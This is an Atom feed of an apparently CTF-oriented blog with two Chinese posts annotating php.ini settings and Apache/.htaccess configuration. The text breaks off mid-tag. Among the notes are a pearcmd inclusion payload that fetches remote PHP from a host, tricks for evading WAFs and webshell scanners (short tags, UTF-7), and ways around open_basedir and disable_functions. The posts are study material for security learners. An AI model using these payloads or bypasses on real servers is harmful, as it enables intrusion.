<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Anti-Genemits</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2020-10-26T03:36:31.508Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>码农</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PHP.INI</title>
    <link href="http://example.com/2020/10/26/PHP-INI/"/>
    <id>http://example.com/2020/10/26/PHP-INI/</id>
    <published>2020-10-26T00:10:53.000Z</published>
    <updated>2020-10-26T03:36:31.508Z</updated>
    
    <content type="html"><![CDATA[<h1 id="深入理解phpinfo"><a href="#深入理解phpinfo" class="headerlink" title="深入理解phpinfo()"></a>深入理解phpinfo()</h1><h2 id="一、php-ini核心配置说明"><a href="#一、php-ini核心配置说明" class="headerlink" title="一、php.ini核心配置说明"></a>一、php.ini核心配置说明</h2><p><strong>short_open_tag</strong>（是否开启PHP代码标志的缩写形式）</p><p>假如被开启了该配置，<code>&lt;? ?&gt;</code>也可以作为php语言开始的标志，可以用于绕过对于<code>&lt;?php</code>的检测。同时<code>&lt;?=</code> 和<code>&lt;? echo</code> 等价。和<code>asp_tags</code>的配置相同，但是后面这个是开启ASP的标志<code>&lt;%%&gt;</code>.但是在7.0.0版本之后就被搞出去了，可能是太好绕过WAF了。</p><p><strong>disable_functions</strong>(禁止内置函数)和<strong>disable_classes</strong>（ 禁止类）</p><p><strong>script_encoding</strong>（如果没有declare语句出现时，生效文件编码）</p><p><strong>variables_order</strong>（<code>E</code>nvironment, <code>G</code>et, <code>P</code>ost, <code>C</code>ookie, and <code>S</code>erver,是否开启这些特殊变量）</p><p><strong>request_order</strong>（指定GET，POST,COOKie进入php寄存器的顺序，从左到右，新值覆盖旧值）</p><p><strong>register_globals</strong>（自动注册PHP变量）<strong>本特性已自 PHP 5.3.0 起<em>废弃</em>并将自 PHP 5.4.0 起<em>移除</em>。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">register_globals &#x3D; on</span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; 当用户合法的时候，赋值 $authorized &#x3D; true</span><br><span class="line">if (authenticated_user()) &#123;</span><br><span class="line">    $authorized &#x3D; true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 由于并没有事先把 $authorized 初始化为 false，</span><br><span class="line">&#x2F;&#x2F; 当 register_globals 打开时，可能通过GET auth.php?authorized&#x3D;1 来定义该变量值</span><br><span class="line">&#x2F;&#x2F; 所以任何人都可以绕过身份验证</span><br><span class="line">if ($authorized) &#123;</span><br><span class="line">    include &quot;&#x2F;highly&#x2F;sensitive&#x2F;data.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">单纯地关闭 register_globals 并不代表所有的代码都安全了。对于每一段提交上来的数据，都要对其进行具体的检查。永远要验证用户数据和对变量进行初始化！</span><br></pre></td></tr></table></figure><p><strong>register_argc_argv</strong>（告诉php是否注册<code>argv &amp; argc variables</code> )</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">命令行模式：https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;features.commandline.php</span><br><span class="line">这样可以通过CLI SAPI 将URL中的数据传递到命令行模式中执行</span><br><span class="line">?f&#x3D;pearcmd&amp;+install&amp;+http:&#x2F;&#x2F;a.com&#x2F;1.php</span><br><span class="line">f是文件包含，将执行这个pearcmd文件，然后输入到了命令行模式了，后面的参数也会传入到命令行中</span><br><span class="line">$argc包含当运行于命令行下时传递给当前脚本的参数的数目。</span><br><span class="line">$argv — 传递给脚本的参数数组</span><br></pre></td></tr></table></figure><p><strong>enable_post_data_reading</strong>（是否启用<a href="https://www.php.net/manual/zh/reserved.variables.post.php">$_POST</a> and <a href="https://www.php.net/manual/zh/reserved.variables.files.php">$_FILES</a>来进行读取数据）</p><p>如果设置为false，就会只能通过<code>php://input</code>来读取传递的数据。</p><p><strong>auto_prepend_file和auto_append_file</strong>（区别在于加载file的时间）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If the script is terminated with exit(), auto-append will not occur.</span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/info.configuration.php#ini.magic-quotes-gpc"><strong>magic_quotes_gpc</strong></a>（开启魔术方法，自动转义）</p><p><strong>include_path</strong>（很重要，但没必要讲）</p><p><strong>open_basedir</strong>（限制包含目录，但是可以绕过）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In httpd.conf, open_basedir can be turned off (e.g. for some virtual hosts) the same way as any other configuration directive with &quot;php_admin_value open_basedir none&quot;.</span><br></pre></td></tr></table></figure><p><strong>cgi.check_shebang_line</strong>（控制PHP是否检测#号开头的行）</p><p><code>cgi.discard_path</code> <a href="https://www.php.net/manual/zh/language.types.boolean.php">boolean</a></p><p>If this is enabled, the PHP CGI binary can safely be placed outside of the web tree and people will not be able to circumvent .htaccess security.</p><p><code>cgi.fix_pathinfo</code> <a href="https://www.php.net/manual/zh/language.types.boolean.php">boolean</a></p><p>Provides <em>real</em> <code>PATH_INFO</code>/ <code>PATH_TRANSLATED</code> support for CGI. PHP’s previous behaviour was to set <code>PATH_TRANSLATED</code> to <code>SCRIPT_FILENAME</code>, and to not grok what <code>PATH_INFO</code> is. For more information on <code>PATH_INFO</code>, see the CGI specs. Setting this to <code>1</code> will cause PHP CGI to fix its paths to conform to the spec. A setting of zero causes PHP to behave as before. It is turned on by default. You should fix your scripts to use <code>SCRIPT_FILENAME</code> rather than <code>PATH_TRANSLATED</code>.</p><p><strong>allow_url_include</strong>解决了远端引用(Include)</p><p><strong>allow_url_fopen</strong>去打开远端的文件</p><p>enable_dl = On （禁用dl()函数主要是出于安全考虑，因为它可以绕过open_basedir指令的限制。）</p><h2 id="二、参考链接"><a href="#二、参考链接" class="headerlink" title="二、参考链接"></a>二、参考链接</h2><p>php.ini详解：<a href="https://www.cnblogs.com/hugongs/articles/1060223.html">https://www.cnblogs.com/hugongs/articles/1060223.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;深入理解phpinfo&quot;&gt;&lt;a href=&quot;#深入理解phpinfo&quot; class=&quot;headerlink&quot; title=&quot;深入理解phpinfo()&quot;&gt;&lt;/a&gt;深入理解phpinfo()&lt;/h1&gt;&lt;h2 id=&quot;一、php-ini核心配置说明&quot;&gt;&lt;a href=</summary>
      
    
    
    
    
    <category term="编程" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Apache_conf</title>
    <link href="http://example.com/2020/10/24/Apache-conf/"/>
    <id>http://example.com/2020/10/24/Apache-conf/</id>
    <published>2020-10-24T12:26:30.000Z</published>
    <updated>2020-10-25T15:47:08.001Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Apache的主要目录和配置文件理解"><a href="#Apache的主要目录和配置文件理解" class="headerlink" title="Apache的主要目录和配置文件理解"></a>Apache的主要目录和配置文件理解</h1><p>参考链接:<a href="http://httpd.apache.org/docs/2.4/misc/security_tips.html">http://httpd.apache.org/docs/2.4/misc/security_tips.html</a></p><h2 id="一、Apache主要配置文件注释（演示）"><a href="#一、Apache主要配置文件注释（演示）" class="headerlink" title="一、Apache主要配置文件注释（演示）"></a>一、Apache主要配置文件注释（演示）</h2><p>Apache的主配置文件位置:<code>/etc/httpd/conf/httpd.conf</code>，默认站点的主目录:<code>/var/www/html/</code></p><p>官方文档的第一句便告诉我们:<code>The location of this file is set at compile-time, but may be overridden with the -f command line flag</code>。And配置文件的修改只有在重启服务器之后才会重新生效，当然<code>htaccess</code>可以在临时目录下更改一些配置，<code>这些是文件上传常常有的漏洞位置</code></p><hr><h3 id="基础配置区"><a href="#基础配置区" class="headerlink" title="基础配置区"></a>基础配置区</h3><ul><li><p><code>ServerRoot &quot;/www/server/apache&quot;</code> 指定用于指定Apache的运行目录，后面的所有相当路径都是以此</p></li><li><p><code>mutex</code>互斥锁，进程调试的一个概念，不会直接跳过</p></li><li><p><code>Listen 0.0.0.0:80</code> appache的监听的ip和端口，可以防止阿帕奇监听太多</p><hr></li></ul><h3 id="模块区"><a href="#模块区" class="headerlink" title="模块区"></a>模块区</h3><ul><li><IfModule><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule http2_module&gt;</span><br><span class="line">ProtocolsHonorOrder On</span><br><span class="line">Protocols h2 http&#x2F;1.1</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure><p>作用：检测模块是否能够使用，如果不能使用则会直接恢复期间的所有数据</p><p>使用地点：当且仅当你的模块必须要配置文件才能启动时，才使用section。module可以是文件名</p><p>可以在htaccess中使用</p></IfModule></li><li><p>LoadModule </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LoadModule authn_file_module modules&#x2F;mod_authn_file.so</span><br><span class="line">将这个动态加载库加载进来并取名为module</span><br></pre></td></tr></table></figure><p>不可在htaccess中使用</p><p>loads the named module from the modules subdirectory of the ServerRoot.</p><p><strong>漏洞</strong>：题目中可能在此处加载一些其他的解释器进行绕过对PHP的限制（详情：西湖挑战杯）</p><p>几个重要模块:</p><p><code>rewrite_module modules/mod_rewrite.so</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">伪静态模块，重写模块，其中的原来我不是很明白，但是有两点作用</span><br><span class="line">1.开启URL匹配的规则，进行重定向，在URL无法解析的，执行其他的规则</span><br><span class="line">2.AllowOverride配合，实现重载部分配置的作用，使htacess生效</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原理解析:AllowOverride参数就是指明Apache服务器是否去找.htacess文件作为配置文件，如果设置为none,那么服务器将忽略.htacess文件，如果设置为All,那么所有在.htaccess文件里有的指令都将被重写。对于AllowOverride，还可以对它指定如下一些能被重写的指令类型. </span><br><span class="line">通常利用Apache的rewrite模块对 URL 进行重写的时候， rewrite规则会写在 .htaccess 文件里。但要使 apache 能够正常的读取.htaccess 文件的内容，就必须对.htaccess 所在目录进行配置。从安全性考虑，根目录的AllowOverride属性一般都配置成不允许任何Override</span><br></pre></td></tr></table></figure><hr></li></ul><h3 id="Scope-of-Directives"><a href="#Scope-of-Directives" class="headerlink" title="Scope of Directives"></a>Scope of Directives</h3><p>  放在主配置文件（行为对根目录的限制），放在这个类型中的（对指定目录下权限限制）</p><ul><li><p><code>&lt;Directory&gt;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &#x2F;&gt;     #行为对根目录的限制</span><br><span class="line">    Options FollowSymLinks   # followsymlinks表示允许使用符号链接，默认为禁用</span><br><span class="line">    AllowOverride None     # 表示禁止用户对目录配置文件(.htaccess进行修改)重载，普通站点不建议开启</span><br><span class="line">&lt;&#x2F;Directory&gt;</span><br><span class="line"></span><br><span class="line">&lt;Directory &quot;&#x2F;var&#x2F;www&#x2F;html&quot;&gt;#行为仅对&#x2F;var&#x2F;www&#x2F;html目录生效</span><br><span class="line">    Options Indexes FollowSymLinks</span><br><span class="line">    AllowOverride None</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Allow from all</span><br><span class="line">&lt;&#x2F;Directory&gt;</span><br></pre></td></tr></table></figure><p>options中Indexes表示当网页不存在的时候允许索引显示目录中的文件，FollowSymLinks是否允许访问符号链接文件。有的选项有ExecCGI表是否使用CGI，如Options Includes ExecCGI FollowSymLinks表示允许服务器执行CGI及SSI，禁止列出目录。SymLinksOwnerMatch表示当符号链接的文件和目标文件为同一用户拥有时才允许访问。</p><p>AllowOverrideNone表示不允许这个目录下的访问控制文件来改变这里的配置，这也意味着不用查看这个目录下的访问控制文件，修改为：AllowOverride All 表示允许.htaccess。Order对页面的访问控制顺序后面的一项是默认选项，如allow，deny则默认是deny，Allowfromall表示允许所有的用户，通过和上一项结合可以控制对网站的访问控制。具体参数参考如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Apply directive AllowOverride None (disabling .htaccess files).</span><br><span class="line">Apply directive AllowOverride FileInfo (for directory &#x2F;home).</span><br><span class="line">Apply any FileInfo directives in &#x2F;home&#x2F;.htaccess, &#x2F;home&#x2F;web&#x2F;.htaccess and &#x2F;home&#x2F;web&#x2F;dir&#x2F;.htaccess in that order.</span><br></pre></td></tr></table></figure><ul><li><p>AllowOverride 不多说了（使htaccess（注意不只是这个文件）中的哪些配置生效）对于不同的配置设置，在<code>htaccess</code>文件中生效的配置，Only available in <Directory> sections</Directory></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">针对于他的三种配置结果有很多的配置生效问题是需要考虑</span><br><span class="line">1.ALL 不用多说</span><br><span class="line">2.None 直接就没有读取htaccess</span><br><span class="line">3.directive-type</span><br><span class="line"> 3.1 AuthConfig</span><br><span class="line"> 3.2 FileInfo</span><br><span class="line"> 3.3 Indexes</span><br><span class="line"> 3.4 Limit</span><br><span class="line"> 3.5 Nonfatal&#x3D;[Override|Unknown|All]</span><br><span class="line"> 3.6 Options</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  下面是无脑配置:</span><br><span class="line">  1.只要支持这个配置项就能生效的配置（截取）</span><br><span class="line">  &lt;Files&gt;，&lt;FilesMatch&gt; 匹配文件</span><br><span class="line">  LimitRequestBody 限制请求的大小 LimitXMLRequestBody</span><br><span class="line">  LuaHookLog 看到这个就要想到该死LUA绕过disfunc</span><br><span class="line">2.AuthConfig（提供一些用户名，密码的检测机制）</span><br><span class="line">  Anonymous_* 检测后面的*类型是不是*类型 检测关键字</span><br></pre></td></tr></table></figure><p>有用的配置内容（懂的都懂）</p><h3 id="FileInfo（对服务器提供的响应和元数据进行广泛的控制）"><a href="#FileInfo（对服务器提供的响应和元数据进行广泛的控制）" class="headerlink" title="FileInfo（对服务器提供的响应和元数据进行广泛的控制）"></a>FileInfo（对服务器提供的响应和元数据进行广泛的控制）</h3><p><strong>Action(为特定处理程序或内容类型激活CGI脚本)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">eg:Action image&#x2F;gif &#x2F;cgi-bin&#x2F;images.cgi</span><br><span class="line">用iamges.cgi来处理image&#x2F;GIF文件</span><br><span class="line">AddHandler my-file-type .xyz（用my来处理.xyz文件）</span><br><span class="line">Action my-file-type &quot;&#x2F;cgi-bin&#x2F;program.cgi&quot;（用program.cgi来付给my）</span><br><span class="line">SetHandler news-handler</span><br><span class="line">Action news-handler &quot;&#x2F;cgi-bin&#x2F;news.cgi&quot; virtual</span><br></pre></td></tr></table></figure><p><strong>AddCharset</strong>（为特定文件设置编码方式）</p><p>默认的编码方式：<a href="http://httpd.apache.org/docs/2.4/mod/core.html#adddefaultcharset">AddDefaultCharset</a></p><p>这个可以用UTF-7等特殊的编码方式来绕过对于PHP文件的内容进行查杀的SHELL进行绕过 <strong>AddEncoding</strong>(为文件增加encode方式)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AddEncoding x-gzip .gz</span><br><span class="line">AddEncoding x-compress .Z</span><br><span class="line">这里的x-很快就被取消掉了，直接使用GZIP和compress的压缩方式就可以了。</span><br></pre></td></tr></table></figure><p>**AddHandler和SetHandler **（ <a href="http://httpd.apache.org/docs/2.4/handler.html">handler</a>）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">这个会和PHP的运行不同可能不能采取，看是否是handler模式运行</span><br><span class="line">Set:强制所有匹配的文件由处理程序处理</span><br><span class="line">&lt;Location &quot;&#x2F;status&quot;&gt;</span><br><span class="line">  SetHandler server-status</span><br><span class="line">&lt;&#x2F;Location&gt; http:&#x2F;&#x2F;servername&#x2F;status was called. 必须放在主配置中</span><br><span class="line">其他的参数就不再多说了，注意查看上面的handler中的内容</span><br><span class="line">Add:将文件扩展名映射到指定的处理程序</span><br><span class="line">AddHandler cgi-script .cgi 这里的cgi-script可以通过上面的action</span><br></pre></td></tr></table></figure><p>**AddType和ForceType **(将给定的文件名扩展名映射到指定的内容类型)</p><p>注意和上面的区别</p><p><a href="http://httpd.apache.org/docs/2.4/mod/core.html#cgimapextension">CGIMapExtension</a>（设置CGI脚本的解释器）</p><p><strong>PassEnv和SetEnv和SetEnvIfExpr</strong>（环境变量的问题）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PASS 是指从shell传递环境变量</span><br><span class="line">Set 是指设置一个环境变量(设置一个内部环境变量，该变量随后可用于Apache HTTP Server模块，并传递给CGI脚本和SSI页面)这个设置的时间是比较晚的，如果要早设置，用SetEnvIf.</span><br><span class="line">SetEnv SPECIAL_PATH &#x2F;foo&#x2F;bin</span><br><span class="line">Unset 可以删除</span><br><span class="line">SetEnvIfExpr 通过一个表达式设置环境变量，字符串</span><br><span class="line">ENV就是环境变量的意识，其他的就是增加了一些条件判断</span><br></pre></td></tr></table></figure><p><strong>Rewrite</strong></p><h3 id="Indexes-控制服务器提供的目录索引页面包括自动索引生成"><a href="#Indexes-控制服务器提供的目录索引页面包括自动索引生成" class="headerlink" title="Indexes(控制服务器提供的目录索引页面包括自动索引生成)"></a>Indexes(控制服务器提供的目录索引页面包括自动索引生成)</h3><h3 id="Limit-授权命令，限制访问"><a href="#Limit-授权命令，限制访问" class="headerlink" title="Limit(授权命令，限制访问)"></a>Limit(授权命令，限制访问)</h3><h3 id="Options-访问Option和类似的指令以及控制过滤器"><a href="#Options-访问Option和类似的指令以及控制过滤器" class="headerlink" title="Options(访问Option和类似的指令以及控制过滤器)"></a>Options(访问Option和类似的指令以及控制过滤器)</h3><p><strong>FilterChain</strong>（设置过滤器链）</p><p><strong>SSLOptions</strong>（SSL链接控制器）</p><p><strong>Options</strong>(配置特定目录中可用的特性)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">1.All</span><br><span class="line">2.ExecCGI(使用cgi脚本)</span><br><span class="line">3.FollowSymLinks</span><br><span class="line">就是允许你的网页文件夹下的链接文件链接到首页目录以外的文件。举例来说，如果你把首页目录设置为&#x2F;var&#x2F;www&#x2F;html，那么你的网页程序最多只能访问到&#x2F;var&#x2F;www&#x2F;html目录，上层目录是不可见的。但是你可以通过链接把文件链接到&#x2F;var&#x2F;www&#x2F;html目录以外的文件以访问该文件，如果FollowSymLinks被设置的话</span><br><span class="line">Even though the server follows the symlink it does not change the pathname used to match against &lt;Directory&gt; sections.</span><br><span class="line">The FollowSymLinks and SymLinksIfOwnerMatch Options work only in &lt;Directory&gt; sections or .htaccess files</span><br><span class="line">4.Includes</span><br><span class="line">Server-side includes provided by mod_include are permitted.</span><br><span class="line">开启服务器端的包含</span><br><span class="line">eg：</span><br><span class="line">AddType text&#x2F;html .shtml</span><br><span class="line">AddOutputFilter INCLUDES .shtml</span><br><span class="line">Options +Includes</span><br><span class="line">5.IncludesNOEXEC</span><br><span class="line">Server-side includes are permitted, but the #exec cmd and #exec cgi are disabled. It is still possible to #include virtual CGI scripts from ScriptAliased directories.</span><br><span class="line">服务器端包括是允许的，但#exec cmd和#exec cgi是禁用的。禁用系统命令</span><br><span class="line">6.Indexes（在目录下没有index.html时是否显示目录结构）</span><br><span class="line">7.MultiViews</span><br><span class="line">Content negotiated &quot;MultiViews&quot; are allowed using mod_negotiation.</span><br><span class="line">Note</span><br><span class="line">This option gets ignored if set anywhere other than &lt;Directory&gt;, as mod_negotiation needs real resources to compare against and evaluate from.</span><br><span class="line"></span><br><span class="line">8.SymLinksIfOwnerMatch</span><br><span class="line">The server will only follow symbolic links for which the target file or directory is owned by the same user id as the link.</span><br><span class="line">Note</span><br><span class="line">The FollowSymLinks and SymLinksIfOwnerMatch Options work only in &lt;Directory&gt; sections or .htaccess files.</span><br><span class="line"></span><br><span class="line">This option should not be considered a security restriction, since symlink testing is subject to race conditions that make it circumventable.</span><br><span class="line"></span><br><span class="line">Normally, if multiple Options could apply to a directory, then the most specific one is used and others are ignored; the options are not merged. (See how sections are merged.) However if all the options on the Options directive are preceded by a + or - symbol, the options are merged. Any options preceded by a + are added to the options currently in force, and any options preceded by a - are removed from the options currently in force.</span><br><span class="line"></span><br><span class="line">Note</span><br><span class="line">Mixing Options with a + or - with those without is not valid syntax and will be rejected during server startup by the syntax check with an abort.</span><br><span class="line"></span><br><span class="line">For example, without any + and - symbols:</span><br><span class="line"></span><br><span class="line">&lt;Directory &quot;&#x2F;web&#x2F;docs&quot;&gt;</span><br><span class="line">  Options Indexes FollowSymLinks</span><br><span class="line">&lt;&#x2F;Directory&gt;</span><br><span class="line"></span><br><span class="line">&lt;Directory &quot;&#x2F;web&#x2F;docs&#x2F;spec&quot;&gt;</span><br><span class="line">  Options Includes</span><br><span class="line">&lt;&#x2F;Directory&gt;</span><br><span class="line">then only Includes will be set for the &#x2F;web&#x2F;docs&#x2F;spec directory. However if the second Options directive uses the + and - symbols:</span><br><span class="line"></span><br><span class="line">&lt;Directory &quot;&#x2F;web&#x2F;docs&quot;&gt;</span><br><span class="line">  Options Indexes FollowSymLinks</span><br><span class="line">&lt;&#x2F;Directory&gt;</span><br><span class="line"></span><br><span class="line">&lt;Directory &quot;&#x2F;web&#x2F;docs&#x2F;spec&quot;&gt;</span><br><span class="line">  Options +Includes -Indexes</span><br><span class="line">&lt;&#x2F;Directory&gt;</span><br><span class="line">then the options FollowSymLinks and Includes are set for the &#x2F;web&#x2F;docs&#x2F;spec directory.</span><br><span class="line"></span><br><span class="line">Note</span><br><span class="line">Using -IncludesNOEXEC or -Includes disables server-side includes completely regardless of the previous setting.</span><br><span class="line"></span><br><span class="line">The default in the absence of any other settings is FollowSymlinks.</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><DirectoryMatch><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;DirectoryMatch &quot;^&#x2F;var&#x2F;www&#x2F;combined&#x2F;(?&lt;sitename&gt;[^&#x2F;]+)&quot;&gt;</span><br><span class="line">    Require ldap-group cn&#x3D;%&#123;env:MATCH_SITENAME&#125;,ou&#x3D;combined,o&#x3D;Example</span><br><span class="line">&lt;&#x2F;DirectoryMatch&gt;</span><br></pre></td></tr></table></figure><p>In order to prevent confusion, numbered (unnamed) backreferences are ignored. Use named groups instead.</p><p><strong>和上面的标签一样,都不能在htaccess中使用</strong></p></DirectoryMatch></li><li><FILE><p>对文件的单独操作，可以在htaccess中使用，并且在htaccess加载完后才会加载，加个match也是一样的效果。</p></FILE></li><li><p><Location> 匹配URL，加个match也是一样的,在file加载完后才会加载</Location></p></li><li><VirtualHost><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以使用虚拟主机上下文中允许的任何指令。当服务器接收到对特定虚拟主机上的文档的请求时，它使用包含在&lt;VirtualHost&gt;部分中的配置指令。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost 10.1.2.3:80&gt;</span><br><span class="line">  ServerAdmin webmaster@host.example.com</span><br><span class="line">  DocumentRoot &quot;&#x2F;www&#x2F;docs&#x2F;host.example.com&quot;</span><br><span class="line">  ServerName host.example.com</span><br><span class="line">  ErrorLog &quot;logs&#x2F;host.example.com-error_log&quot;</span><br><span class="line">  TransferLog &quot;logs&#x2F;host.example.com-access_log&quot;#这个日志文件如果是别人可以写入的，那就需要重新衡量一下这个安全等级了。</span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br></pre></td></tr></table></figure><p>一些都是正常的配置命名，不用细说的命令。</p><hr></VirtualHost></li></ul><h2 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h2><p>参考链接：1.<a href="http://httpd.apache.org/docs/2.4/howto/htaccess.html">http://httpd.apache.org/docs/2.4/howto/htaccess.html</a></p><p>2.<a href="http://httpd.apache.org/docs/2.4/mod/overrides.html">http://httpd.apache.org/docs/2.4/mod/overrides.html</a></p><ul><li><p>AccessFileName</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AccessFileName .acl</span><br></pre></td></tr></table></figure><p>Before returning the document <code>/usr/local/web/index.html</code>, the server will read <code>/.acl</code>, <code>/usr/.acl</code>, <code>/usr/local/.acl</code> and <code>/usr/local/web/.acl</code> for directives unless they have been disabled with</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Name of the distributed configuration file（分布式的脚本配置文件）可以在htaccess中使用</span><br></pre></td></tr></table></figure><p><strong>可以绕过对于htaccess文件的限制</strong></p></li></ul><p>参考链接:</p><p>1.核心功能：<a href="http://httpd.apache.org/docs/2.4/mod/core.html">http://httpd.apache.org/docs/2.4/mod/core.html</a></p><p>2.mod中的mod_mime：<a href="https://www.jb51.net/tools/onlinetools/apache-chs/mod/mod_mime.html">https://www.jb51.net/tools/onlinetools/apache-chs/mod/mod_mime.html</a></p><h2 id="二、Apache的语法规则"><a href="#二、Apache的语法规则" class="headerlink" title="二、Apache的语法规则"></a>二、Apache的语法规则</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SetEnv SPECIAL_PATH &#x2F;foo&#x2F;bin</span><br><span class="line">这是设置环境变量</span><br></pre></td></tr></table></figure><ul><li><p>AcceptPathInfo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span 